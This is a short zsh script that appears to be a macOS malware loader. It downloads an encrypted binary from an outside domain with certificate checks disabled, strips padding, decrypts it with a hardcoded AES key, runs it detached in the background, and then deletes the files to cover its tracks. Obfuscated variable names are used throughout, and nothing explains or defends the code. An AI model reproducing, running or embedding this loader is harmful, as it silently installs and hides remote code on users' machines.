#!/bin/zsh
d6chv=$(mktemp /tmp/7wfmaa.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m73fefee26bbd48cb.bin" -o "$d6chvz" || exit 1
zqa99n=$(stat -f %z "$d6chvz"); dg4dssz=$(( zqa99n - 3600 - 735 ))
tail -c +$(( 3600 + 1 )) "$d6chvz" | head -c $dg4dssz | openssl enc -d -aes-256-cbc -k a3a897cba6ef3493e5843a66 -out "$d6chv" 2>/dev/null
[ -s "$d6chv" ] && chmod 700 "$d6chv" && ( "$d6chv" & ) && disown
( sleep 3; rm -f "$d6chv" "$d6chvz" ) &>/dev/null &
